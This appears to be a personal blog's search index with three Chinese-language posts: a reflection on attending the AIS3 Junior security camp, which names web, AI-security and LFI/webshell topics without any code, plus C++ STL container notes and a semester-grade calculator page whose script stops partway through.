<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AIS3 Junior 心得</title>
    <url>/AIS3-Junior/</url>
    <content><![CDATA[<hr>
<h3 id="前言">前言</h3>
<p>今年的 AIS3 Junior 舉辦在中正大學，課程共五天，也一樣有提供住宿及車票補助。超讚ㄉ<br>
我去年也曾參加 AIS3 Junior，不過因為當時是初次接觸資安，雖然最終有順利取得合格證書，但許多技術細節仍有些不熟悉。考量時間許可的情況下，我再次報名並順利被甄選錄取了！</p>
<hr>
<h3 id="住宿">住宿</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/dorm.png"
                      alt="image"
                ><br>
課程期間都是住在中正大學的學生宿舍(四人房)，要記得帶自己的拖鞋、枕頭、棉被、睡墊(很重要.ᐟ.ᐟ.ᐟ)、盥洗用品及吹風機等。裡面雖然有點老舊但還算乾淨，廁所也看得出來有重新裝修過，而且有乾濕分離。不過因為床板超硬，所以沒帶睡墊的話，根本睡不著而且因為床板老舊，翻身時還會有奇怪聲響。宿舍附近有超商和早餐店，半夜肚子餓的話可以去超商買消夜吃。不過課程所在的資訊大樓附近基本上就沒甚麼吃的了，除了活動中心那棟裡面有超商、貴貴的義大利麵和幾間學生餐廳外，其他吃的幾乎都要走出正門大概10分鐘左右才能找到。這幾天基本上不是跟助教、組員們一起吃，就是等回宿舍再去超商買或投販賣機。</p>
<hr>
<h3 id="Day-0">Day 0</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/register.png"
                      alt="image"
                ><br>
這天是課程中最輕鬆的一天，不過因為中正大學地理位置較偏僻，所以不論是搭高鐵或是臺鐵都要花上不少時間轉車。我是當天早上搭臺鐵到嘉義車站，在嘉義市區晃到下午再搭臺鐵到民雄車站，然後剛好在課程群組裡找到其他三人也要從民雄車站移動到中正大學，於是就四個人一起搭計程車去(跳表，車資220元)。抵達會場並報到後，安裝 Kali 環境、VPN 和認識助教及組員等。傍晚要從集合的圖書資訊大樓拖行李到宿舍，路途約15分鐘但半路突然突如其來的傾盆大雨讓我們的衣物、鞋子和行李都濕了。稍微整理後，我和助教及組員們一起吃附近的小火鍋。再次回到宿舍後，我和室友先解了幾題隔天上課的 Flag。</p>
<blockquote>
<p>本日睡眠時間： 01:30~07:00，約5.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-1">Day 1</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/CTF.png"
                      alt="image"
                ><br>
早上和助教及組員們一起吃完早餐後，拖著疲憊的身體前往資訊大樓開始一天的課程。早上的活動是開幕式和資安倫理課程，讓我們瞭解學習資安技術應具備的道德與責任。下午則進行破冰遊戲，需要根據提示並運用基礎資安概念解題，完成一定題數還有餅乾。隨後的資安概論課程聚焦於 Linux 指令的實際操作，基本上只要熟悉 Linux 大部分的 Flag 都不難找到。</p>
<blockquote>
<p>本日睡眠時間： 02:30~07:00，約4.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-2">Day 2</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/lecture.png"
                      alt="image"
                ><br>
今天主要的課程是由 <strong>徐牧遠(Red) 講師</strong> 帶來的網頁安全。我曾在去年的課程中學習過 Web Security，因此能跟上講師的節奏，也解出了不少進階題。晚上則安排了資安講座，邀請資安大佬 <strong>馬聖豪 前輩</strong>，分享自己從小透過撰寫遊戲外掛賺錢到參加第一屆 AIS3，最終在資安領域嶄露頭角的心路歷程。</p>
<blockquote>
<p>本日睡眠時間： 03:00~07:30，約4.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-3">Day 3</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/project.png"
                      alt="image"
                ><br>
最後一門課程是由 <strong>周佑康(Slash) 講師</strong> 帶來的 AI 應用安全實務。我覺得 AI 應用安全是個全新的體驗。因為我從未想過利用這些攻擊方法來影響人工智慧，取得可能混進訓練資料中的敏感資訊或在圖片中加入雜訊使神經網路辨認錯誤。講師從 LLM 的訓練原理講起，並介紹常見的大型語言模型及講解 Prompt Injection 這個攻擊方法。課後作業則是從講師提供的 AI 服務中取得機密資訊。此外，我們在這堂課中也學習了 CNN 辨識影像的原理，並學習攻擊方法 - Adversarial Attack，透過演算法在圖片中加入許多極小的雜訊，使神經網路無法正確辨識圖片。因為隔天就要發表專題了，所以我們今晚熬夜將作業的 writeup 完成並將專題推到一定進度後才去睡覺。</p>
<blockquote>
<p>本日睡眠時間： 04:30~07:00，約2.5小時。</p>
</blockquote>
<hr>
<h3 id="Day-4">Day 4</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/report.png"
                      alt="image"
                ><br>
今天早上是最後的專題製作時間，我們這組的專題名稱是 「原來 log 也可以寫 webshell !? 」 主要是透過 php 的 strcmp 函式漏洞 bypass 登入頁面，接著利用系統中的 LFI 漏洞實現 RCE。下午則是各組上台發表專題，讓其他組別的學員聆聽與學習的時間。從選定主題、漏洞復現到最終完成專題、上台分享時，那成就感不言而喻。雖然在處理環境時，我們遇到了不少問題，但一次次克服問題後，我們都會有更多的收穫。能將學到的知識與經驗分享給大家，也是一次非常寶貴的學習機會。</p>
<hr>
<h3 id="心得">心得</h3>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior/ending.png"
                      alt="image"
                ><br>
首先我要感謝 <strong>C組組員們</strong>、<strong>Kazma 助教</strong>和<strong>Sharon 助教</strong>，感謝你們在這幾天提供了我這麼多的幫助。雖然在專題中，我負責的是蒐集資料和尋找漏洞的防範方法，但對 php 不熟的我，光是搞懂基本語法就花了些時間。理解攻擊方法後尋找先例並思考有效的防範方法更是花了快一整晚。不過我們也順利在最後一天完成專題，並和組員們一起上台發表。參加這次課程，讓我認識了許多電神並對未來的學習有了明確方向，甚至有幸與 <strong>Kazma</strong>、<strong>Vincent</strong>、<strong>OsGa</strong> 等厲害的學長們同桌吃早餐真的是我沒有想到的。不過這也讓我意識到，自己在資安領域還有很多技術需要學習、探索。雖然目前的學習深度和廣度還不足以完全應對現實世界中的攻擊與威脅，但對未來繼續深入學習充滿了動力！沒意外的話，我未來應該也會往這方面升學吧！雖然很累，但學到新知識及技術的成就感，真的讓人有想要繼續研究下去的動力。<strong>To be a good hacker !</strong> 💪💪</p>
]]></content>
      <categories>
        <category>課程學習</category>
        <category>AIS3</category>
      </categories>
      <tags>
        <tag>課程</tag>
        <tag>AIS3</tag>
        <tag>心得</tag>
      </tags>
  </entry>
  <entry>
    <title>STL 筆記</title>
    <url>/STL/</url>
    <content><![CDATA[<h2 id="Pair">Pair</h2>
<h4 id="簡介">簡介</h4>
<p>pair 可以儲存一對不同類型的資料，由 <code>first</code> 與 <code>second</code> 兩個成員組成</p>
<h4 id="特性">特性</h4>
<ul>
<li>支援不同資料類型的組合</li>
<li>可以進行比較（先比<code>first</code>，若相同則比<code>second</code>）</li>
</ul>
<h4 id="語法">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告</span></span><br><span class="line">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pos;     <span class="comment">// 儲存一對整數</span></span><br><span class="line">pair&lt;<span class="type">int</span>, string&gt; tmp;  <span class="comment">// 儲存整數與字串的組合</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 賦值方式</span></span><br><span class="line">pos = &#123;<span class="number">3</span>, <span class="number">4</span>&#125;;                        <span class="comment">// 使用初始化列表</span></span><br><span class="line">tmp = <span class="built_in">make_pair</span>(<span class="number">1</span>, <span class="string">&quot;hello, world&quot;</span>);  <span class="comment">// 使用 make_pair 函數</span></span><br><span class="line"><span class="function">pair&lt;<span class="type">int</span>, string&gt; <span class="title">p3</span><span class="params">(<span class="number">2</span>, <span class="string">&quot;test&quot;</span>)</span></span>;     <span class="comment">// 使用建構函式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 取值與修改</span></span><br><span class="line"><span class="type">int</span> f = pos.first;       <span class="comment">// 取得 pos 的第一個值，結果為 3</span></span><br><span class="line">string s = tmp.second;   <span class="comment">// 取得 tmp 的第二個值，結果為 &quot;hello, world&quot;</span></span><br><span class="line">pos.first = <span class="number">0</span>;          <span class="comment">// 修改第一個值</span></span><br><span class="line">tmp.second = <span class="string">&quot;hello&quot;</span>;   <span class="comment">// 修改第二個值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 輸出</span></span><br><span class="line">cout &lt;&lt; pos.first &lt;&lt; <span class="string">&quot;、&quot;</span> &lt;&lt; pos.second;  <span class="comment">// 輸出：0、4</span></span><br><span class="line">cout &lt;&lt; tmp.first &lt;&lt; <span class="string">&quot;、&quot;</span> &lt;&lt; tmp.second;  <span class="comment">// 輸出：1、hello</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Vector">Vector</h2>
<h4 id="簡介-2">簡介</h4>
<p>vector 是動態陣列，能夠在執行期間根據需求調整大小，並新增或刪除元素</p>
<h4 id="特性-2">特性</h4>
<ul>
<li>支援隨機存取</li>
<li>在尾端新增/刪除元素效率較高</li>
<li>在中間插入/刪除元素效率較低</li>
<li>當空間不足時，會自動擴展容量</li>
</ul>
<h4 id="語法-2">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告方式</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v1;            <span class="comment">// 宣告空的整數向量</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v2</span><span class="params">(<span class="number">5</span>)</span></span>;         <span class="comment">// 宣告大小為 5 的整數向量（預設值為 0）</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(n, <span class="number">0</span>)</span></span>;      <span class="comment">// 宣告大小為 n 的整數向量，所有元素初始化為 0</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v4 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;  <span class="comment">// 使用初始值列表宣告向量</span></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">v5</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m, <span class="number">2</span>));  <span class="comment">// 宣告 n×m 的二維向量，所有元素初始化為 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 容量相關操作</span></span><br><span class="line"><span class="type">int</span> len = v<span class="number">4.</span><span class="built_in">size</span>();      <span class="comment">// 取得目前的元素數量</span></span><br><span class="line"><span class="type">int</span> cap = v<span class="number">4.</span><span class="built_in">capacity</span>();  <span class="comment">// 取得目前分配的空間大小</span></span><br><span class="line"><span class="type">bool</span> empty = v<span class="number">4.</span><span class="built_in">empty</span>();  <span class="comment">// 檢查向量是否為空</span></span><br><span class="line">v<span class="number">4.</span><span class="built_in">resize</span>(<span class="number">5</span>, <span class="number">0</span>);         <span class="comment">// 調整大小為 5，新增的元素初始化為 0</span></span><br><span class="line">v<span class="number">4.</span><span class="built_in">reserve</span>(<span class="number">10</span>);          <span class="comment">// 預先配置可容納 10 個元素的空間</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 存取元素</span></span><br><span class="line"><span class="type">int</span> value = v4[<span class="number">1</span>];        <span class="comment">// 使用 [] 運算子存取（不會檢查範圍）</span></span><br><span class="line"><span class="type">int</span> value2 = v<span class="number">4.</span><span class="built_in">at</span>(<span class="number">1</span>);    <span class="comment">// 使用 at() 方法存取（會檢查範圍）</span></span><br><span class="line"><span class="type">int</span> front = v<span class="number">4.f</span>ront();   <span class="comment">// 取得第一個元素</span></span><br><span class="line"><span class="type">int</span> back = v<span class="number">4.</span><span class="built_in">back</span>();     <span class="comment">// 取得最後一個元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增與刪除</span></span><br><span class="line">v<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">1</span>);         <span class="comment">// 在尾端加入元素 1</span></span><br><span class="line">v<span class="number">1.</span><span class="built_in">emplace_back</span>(<span class="number">2</span>);      <span class="comment">// 在尾端直接構造元素 2（較有效率）</span></span><br><span class="line">v<span class="number">1.</span><span class="built_in">pop_back</span>();           <span class="comment">// 移除尾端元素</span></span><br><span class="line">v<span class="number">1.</span><span class="built_in">clear</span>();              <span class="comment">// 清空所有元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍歷方式</span></span><br><span class="line"><span class="comment">// 1. 使用索引（建議用於需要修改索引值的情況）</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v<span class="number">1.</span><span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    cout &lt;&lt; v1[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用範圍式 for 迴圈（較簡潔）</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="type">int</span>&amp; num : v4) &#123;  <span class="comment">// 使用參考避免複製</span></span><br><span class="line">    cout &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 使用迭代器（可以使用 STL 演算法）</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = v<span class="number">4.</span><span class="built_in">begin</span>(); it != v<span class="number">4.</span><span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="Stack">Stack</h2>
<h4 id="簡介-3">簡介</h4>
<p>stack 是一種後進先出的容器，就像疊盤子一樣，只能從頂端操作元素</p>
<h4 id="特性-3">特性</h4>
<ul>
<li>無法遍歷</li>
<li>只能從頂端新增或移除元素</li>
</ul>
<h4 id="語法-3">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告</span></span><br><span class="line">stack&lt;<span class="type">int</span>&gt; s;          <span class="comment">// 宣告整數堆疊</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">s.<span class="built_in">push</span>(<span class="number">1</span>);              <span class="comment">// 將元素 1 推入堆疊</span></span><br><span class="line">s.<span class="built_in">push</span>(<span class="number">2</span>);              <span class="comment">// 將元素 2 推入堆疊</span></span><br><span class="line">s.<span class="built_in">emplace</span>(<span class="number">3</span>);           <span class="comment">// 直接在堆疊頂端構造元素 3</span></span><br><span class="line">s.<span class="built_in">pop</span>();                <span class="comment">// 移除頂端元素</span></span><br><span class="line"><span class="type">int</span> top = s.<span class="built_in">top</span>();      <span class="comment">// 取得頂端元素</span></span><br><span class="line"><span class="type">bool</span> empty = s.<span class="built_in">empty</span>(); <span class="comment">// 檢查堆疊是否為空</span></span><br><span class="line"><span class="type">int</span> size = s.<span class="built_in">size</span>();    <span class="comment">// 取得堆疊中的元素數量</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Queue">Queue</h2>
<h4 id="簡介-4">簡介</h4>
<p>queue 是一種先進先出的容器，就像排隊一樣，依照進入順序處理元素</p>
<h4 id="特性-4">特性</h4>
<ul>
<li>無法遍歷</li>
<li>只能從尾端加入元素，從前端移除元素</li>
</ul>
<h4 id="語法-4">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告</span></span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;           <span class="comment">// 宣告整數佇列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">q.<span class="built_in">push</span>(<span class="number">1</span>);              <span class="comment">// 將元素 1 加入佇列尾端</span></span><br><span class="line">q.<span class="built_in">push</span>(<span class="number">2</span>);              <span class="comment">// 將元素 2 加入佇列尾端</span></span><br><span class="line">q.<span class="built_in">emplace</span>(<span class="number">3</span>);           <span class="comment">// 直接在佇列尾端構造元素 3</span></span><br><span class="line">q.<span class="built_in">pop</span>();                <span class="comment">// 移除前端元素</span></span><br><span class="line"><span class="type">int</span> front = q.<span class="built_in">front</span>();  <span class="comment">// 取得前端元素</span></span><br><span class="line"><span class="type">int</span> back = q.<span class="built_in">back</span>();    <span class="comment">// 取得尾端元素</span></span><br><span class="line"><span class="type">bool</span> empty = q.<span class="built_in">empty</span>(); <span class="comment">// 檢查佇列是否為空</span></span><br><span class="line"><span class="type">int</span> size = q.<span class="built_in">size</span>();    <span class="comment">// 取得佇列中的元素數量</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Dequeue">Dequeue</h2>
<h4 id="簡介-5">簡介</h4>
<p>deque 提供了在兩端快速插入和刪除的功能，同時支援隨機存取</p>
<h4 id="特性-5">特性</h4>
<ul>
<li>支援隨機存取</li>
<li>在兩端插入/刪除的效率都很高</li>
<li>記憶體使用比 vector 更有彈性</li>
<li>雖然方便，但由於常數較大，可能導致運行時間較長</li>
</ul>
<h4 id="語法-5">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告</span></span><br><span class="line">deque&lt;<span class="type">int</span>&gt; dq;          <span class="comment">// 宣告整數雙向佇列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">dq.<span class="built_in">push_back</span>(<span class="number">1</span>);        <span class="comment">// 在尾端加入元素 1</span></span><br><span class="line">dq.<span class="built_in">push_front</span>(<span class="number">2</span>);       <span class="comment">// 在前端加入元素 2</span></span><br><span class="line">dq.<span class="built_in">pop_back</span>();          <span class="comment">// 移除尾端元素</span></span><br><span class="line">dq.<span class="built_in">pop_front</span>();         <span class="comment">// 移除前端元素</span></span><br><span class="line"><span class="type">int</span> front = dq.<span class="built_in">front</span>(); <span class="comment">// 取得前端元素</span></span><br><span class="line"><span class="type">int</span> back = dq.<span class="built_in">back</span>();   <span class="comment">// 取得尾端元素</span></span><br><span class="line"><span class="type">int</span> size = dq.<span class="built_in">size</span>();   <span class="comment">// 取得元素數量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 隨機存取</span></span><br><span class="line"><span class="type">int</span> value = dq[<span class="number">2</span>];      <span class="comment">// 取得索引 2 的元素</span></span><br><span class="line">dq[<span class="number">2</span>] = <span class="number">10</span>;             <span class="comment">// 修改索引 2 的元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入和刪除</span></span><br><span class="line">dq.<span class="built_in">insert</span>(dq.<span class="built_in">begin</span>() + <span class="number">2</span>, <span class="number">5</span>);  <span class="comment">// 在指定位置插入元素</span></span><br><span class="line">dq.<span class="built_in">erase</span>(dq.<span class="built_in">begin</span>() + <span class="number">2</span>);      <span class="comment">// 刪除指定位置的元素</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Priority-Queue">Priority Queue</h2>
<h4 id="簡介-6">簡介</h4>
<p>priority queue 是一種特殊的佇列，會根據元素的優先級自動排序</p>
<h4 id="語法-6">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告</span></span><br><span class="line"><span class="comment">// 預設為最大堆（max heap）</span></span><br><span class="line">priority_queue&lt;<span class="type">int</span>&gt; pq;</span><br><span class="line"><span class="comment">// 宣告最小堆（min heap）</span></span><br><span class="line">priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; min_pq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">pq.<span class="built_in">push</span>(<span class="number">10</span>);           <span class="comment">// 插入元素 10</span></span><br><span class="line">pq.<span class="built_in">push</span>(<span class="number">5</span>);            <span class="comment">// 插入元素 5</span></span><br><span class="line">pq.<span class="built_in">push</span>(<span class="number">20</span>);           <span class="comment">// 插入元素 20</span></span><br><span class="line">pq.<span class="built_in">emplace</span>(<span class="number">15</span>);        <span class="comment">// 直接構造元素 15</span></span><br><span class="line"><span class="type">int</span> top = pq.<span class="built_in">top</span>();    <span class="comment">// 取得最高優先級元素</span></span><br><span class="line">pq.<span class="built_in">pop</span>();              <span class="comment">// 移除最高優先級元素</span></span><br><span class="line"><span class="type">int</span> size = pq.<span class="built_in">size</span>();  <span class="comment">// 取得元素數量</span></span><br><span class="line"><span class="type">bool</span> empty = pq.<span class="built_in">empty</span>(); <span class="comment">// 檢查是否為空</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Set">Set</h2>
<h4 id="簡介-7">簡介</h4>
<p>set 是一個有序且不含重複元素的集合</p>
<h4 id="特性-6">特性</h4>
<ul>
<li>自動排序元素</li>
<li>忽略重複元素</li>
<li>操作效率極高</li>
<li>可以用迭代器遍歷</li>
</ul>
<h4 id="語法-7">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告</span></span><br><span class="line">set&lt;<span class="type">int</span>&gt; s;            <span class="comment">// 宣告整數集合</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">1</span>);           <span class="comment">// 插入元素 1</span></span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">2</span>);           <span class="comment">// 插入元素 2</span></span><br><span class="line">s.<span class="built_in">emplace</span>(<span class="number">3</span>);          <span class="comment">// 直接構造並插入元素 3</span></span><br><span class="line">s.<span class="built_in">erase</span>(<span class="number">1</span>);            <span class="comment">// 刪除元素 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找操作</span></span><br><span class="line"><span class="type">bool</span> exists = s.<span class="built_in">find</span>(<span class="number">2</span>) != s.<span class="built_in">end</span>();  <span class="comment">// 檢查元素 2 是否存在</span></span><br><span class="line"><span class="keyword">auto</span> it = s.<span class="built_in">lower_bound</span>(<span class="number">2</span>);  <span class="comment">// 找到大於等於 2 的第一個元素</span></span><br><span class="line"><span class="keyword">auto</span> it2 = s.<span class="built_in">upper_bound</span>(<span class="number">2</span>); <span class="comment">// 找到大於 2 的第一個元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 容量操作</span></span><br><span class="line"><span class="type">int</span> size = s.<span class="built_in">size</span>();   <span class="comment">// 取得元素數量</span></span><br><span class="line"><span class="type">bool</span> empty = s.<span class="built_in">empty</span>(); <span class="comment">// 檢查是否為空</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍歷（依序遞增）</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="type">int</span>&amp; num : s) &#123;</span><br><span class="line">    cout &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="Map">Map</h2>
<h4 id="簡介-8">簡介</h4>
<p>map 是一種關聯式容器，可將鍵（key）對應到值（value）</p>
<h4 id="特性-7">特性</h4>
<ul>
<li>鍵值必須唯一</li>
<li>支援隨機存取</li>
<li>自動依鍵值排序</li>
</ul>
<h4 id="語法-8">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告</span></span><br><span class="line">map&lt;<span class="type">int</span>, string&gt; m;    <span class="comment">// 宣告以整數為鍵、字串為值的映射</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素</span></span><br><span class="line">m[<span class="number">1</span>] = <span class="string">&quot;apple&quot;</span>;        <span class="comment">// 使用 [] 運算子插入或更新</span></span><br><span class="line">m[<span class="number">2</span>] = <span class="string">&quot;banana&quot;</span>;       <span class="comment">// 插入或更新鍵值對</span></span><br><span class="line">m.<span class="built_in">insert</span>(&#123;<span class="number">3</span>, <span class="string">&quot;cherry&quot;</span>&#125;); <span class="comment">// 使用 insert 方法插入</span></span><br><span class="line">m.<span class="built_in">emplace</span>(<span class="number">4</span>, <span class="string">&quot;date&quot;</span>);   <span class="comment">// 直接構造並插入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 存取元素</span></span><br><span class="line">string value = m[<span class="number">2</span>];    <span class="comment">// 使用 [] 運算子存取（如果鍵不存在會創建）</span></span><br><span class="line">string value2</span><br></pre></td></tr></table></figure></div>
<h2 id="Bitset">Bitset</h2>
<h4 id="簡介-9">簡介</h4>
<p>bitset 是用於處理位元運算的容器，每個位元只使用 1 bit 的空間</p>
<h4 id="特性-8">特性</h4>
<ul>
<li>位元索引從右至左，最右邊索引為 0</li>
<li>可直接進行 AND、OR、XOR 等位元運算</li>
</ul>
<h4 id="語法-9">語法</h4>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 宣告</span></span><br><span class="line">bitset&lt;5&gt; b;           <span class="comment">// 宣告長度為 5 的位元集合，預設為 00000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">b.<span class="built_in">set</span>();               <span class="comment">// 將所有位元設為 1（11111）</span></span><br><span class="line">b.<span class="built_in">reset</span>();             <span class="comment">// 將所有位元設為 0（00000）</span></span><br><span class="line"><span class="type">int</span> ones = b.<span class="built_in">count</span>();  <span class="comment">// 計算值為 1 的位元數量</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>學習筆記</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>筆記</tag>
        <tag>C++</tag>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title>學期成績計算</title>
    <url>/score/</url>
    <content><![CDATA[
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #f9f9f9;
            color: #333;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        label {
            font-weight: bold;
        }

        input, button {
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 6px;
            width: 100%;
            font-size: 16px;
            box-sizing: border-box;
            font-family: inherit;
        }

        input::placeholder {
            color: #888;
        }

        input {
            background-color: #fff;
            color: #333;
            border: 1px solid #ccc;
        }

        button {
            background-color: #888;
            color: white;
            border: none;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background-color: #818181;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
        }

        body.dark-mode {
            background-color: #1e1e1e;
            color: #e0e0e0;
        }

        body.dark-mode input {
            background-color: #333333;
            color: #e0e0e0;
            border: 1px solid #444;
        }

        body.dark-mode input::placeholder {
            color: #888;
        }

        body.dark-mode button {
            background-color: #555;
            color: white;
            border: none;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        body.dark-mode button:hover {
            background-color: #777;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
        }

        @media (max-width: 600px) {
            input, button {
                font-size: 14px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <h5>請輸入以下成績並按下按鈕，計算結果將顯示在按鈕下方。</h5>
    <hr>
    <form id="score-form">
        <label for="score1">第一次段考成績:</label>
        <input type="number" id="score1" name="score1" placeholder="必填" min="0" max="100" required>

        <label for="score2">第二次段考成績:</label>
        <input type="number" id="score2" name="score2" placeholder="必填" min="0" max="100" required>

        <label for="score3">第三次段考成績:</label>
        <input type="number" id="score3" name="score3" placeholder="選填" min="0" max="100">

        <label for="score4">平時成績:</label>
        <input type="number" id="score4" name="score4" placeholder="選填" min="0" max="100">

        <label for="previous_score">上學期成績:</label>
        <input type="number" id="previous_score" name="previous_score" placeholder="選填" min="0" max="100">

        <button type="submit">計算</button>
        
        <h4>計算結果</h4>
        <p id="result">計算結果僅供參考，祝段考順利！</p>
    </form>

    <script data-swup-reload-script type="text/javascript">
        document.getElementById('score-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const getInputValue = (id) => parseFloat(document.getElementById(id).value);
            const roundToOneDecimal = (num) => parseFloat(num.toFixed(1));

            const score1 = getInputValue('score1');
            const score2 = getInputValue('score2');
            const score3 = getInputValue('score3');
            const score4 = getInputValue('score4');
            const previousScore = getInputValue('previous_score');

            const weightedScore1 = roundToOneDecimal(score1 * 0.2);
            const weightedScore2 = roundToOneDecimal(score2 * 0.2);
            const weightedScore3 = isNaN(score3) ? 0 : roundToOneDecimal(score3 * 0.3);
            const weightedScore4 = isNaN(score4) ? 0 : roundToOneDecimal(score4 * 0.3);
            const totalScore = roundToOneDecimal(weightedScore1 + weightedScore2 + weightedScore3 + weightedScore4);

            let responseMessage = "";

            const calculateRequiredScore = (currentTotal, weight) => roundToOneDecimal((59.5 - currentTotal) / weight);
            const calculateRequiredBothSemesters = (currentTotal, weight) => roundToOneDecimal((120 - previousScore - currentTotal) / weight);

            if (isNaN(score3) && isNaN(score4) && isNaN(previousScore)) {
                responseMessage = `總分(三段+平時)至少為 ${calculateRequiredScore(weightedScore1 + weightedScore2, 0.3)} 分。`;
            } else if (!isNaN(score3) && isNaN(score4) && isNaN(previousScore)) {
                const requiredScore4 = calculateRequiredScore(weightedScore1 + weightedScore2 + weightedScore3, 0.3);
                responseMessage = `平時成績至少為 ${requiredScore4} 分。`;
            } else if (isNaN(score3) && !isNaN(score4) && isNaN(previousScore)) {
